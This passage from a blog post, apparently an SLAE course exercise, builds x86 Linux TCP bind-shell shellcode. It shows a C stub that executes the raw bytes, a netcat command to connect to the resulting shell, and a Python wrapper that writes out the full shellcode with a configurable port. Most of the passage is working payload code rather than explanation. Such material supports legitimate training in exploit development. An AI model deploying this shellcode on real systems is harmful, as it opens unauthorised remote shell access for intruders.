<span class="s">"</span><span class="se">\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>


<span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
  <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span></code></pre></figure>

<p>Compile with: ~gcc shellcode.c -o shellcode~ Run with: ~./shellcode~
Connect with: ~nc -nv 127.0.0.1 4444~</p>

<p>And it works! We get our shell. The shellcode is 122 bytes without
really trying to optimize. We can always go back and try to
optimize. We also need to update the program to make the port number
easily configurable.</p>

<p>Let’s write a wrapper script to set our port. We just accept the port
as a command line argument to our script and interpolate it into our
shellcode and print out the result:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="k">print</span> <span class="s">"Fail!"</span>

<span class="n">port_number</span>     <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">bts</span>             <span class="o">=</span> <span class="p">[</span><span class="n">port_number</span> <span class="o">&gt;&gt;</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">)]</span>
<span class="n">filtered</span>        <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bts</span> <span class="k">if</span> <span class="n">b</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">]</span>
<span class="n">formatted</span>       <span class="o">=</span> <span class="p">[</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="s">'x'</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">filtered</span><span class="p">]</span>
<span class="n">joined</span>          <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">formatted</span><span class="p">)</span>

<span class="n">shellcode</span><span class="o">=</span><span class="s">"</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x68"</span> <span class="o">+</span> <span class="n">joined</span> <span class="o">+</span> <span class="s">"</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x57"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x04</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x57"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x05</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x51"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xb1</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x3f</span><span class="se">\\</span><span class="s">xcd"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x49</span><span class="se">\\</span><span class="s">x79</span><span class="se">\\</span><span class="s">xf9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x73</span><span class="se">\\</span><span class="s">x68"</span>
<span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x69</span><span class="se">\\</span><span class="s">x6e</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80"</span>

<span class="k">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span></code></pre></figure>

<p>Once we have our script we print out our updated shellcode and pop it
back into our shellcode.c stub program, compile and test a
connection. When we do, we get our shell again. And even better, we
can change the port to whatever we would like to yield the proper
shellcode.</p>


          </div>

          <div class="article-share">
            
            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 1: TCP Bind Shell Shellcode - http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode ', 'newwindow', 'width=500, height=225'); return false;">
              <span class="icon icon-social-twitter"></span>
            </a>
            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=500, height=500'); return false;">
              <span class="icon icon-social-facebook"></span>
            </a>
            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=550, height=400'); return false;">
              <span class="icon icon-social-googleplus"></span>
            </a>
          </div>

          
        </article>
        <footer class="footer reveal">
  <p>
    Chalk is a high quality, completely customizable, performant and 100% free
    blog template for Jekyll built by
    <a href="/about" title="About me">Nielsen Ramon</a>. Download it <a href="https://github.com/nielsenramon/chalk" target="_blank" title="Download Chalk">here</a>.
  </p>
</footer>

      </div>
    </div>
  </main>
  <script type="text/javascript" src="/assets/vendor.js"></script>
<script type="text/javascript" src="/assets/application.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
<script>
  WebFont.load({
    google: {
      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
    }
  });
</script>



</body>
</html>
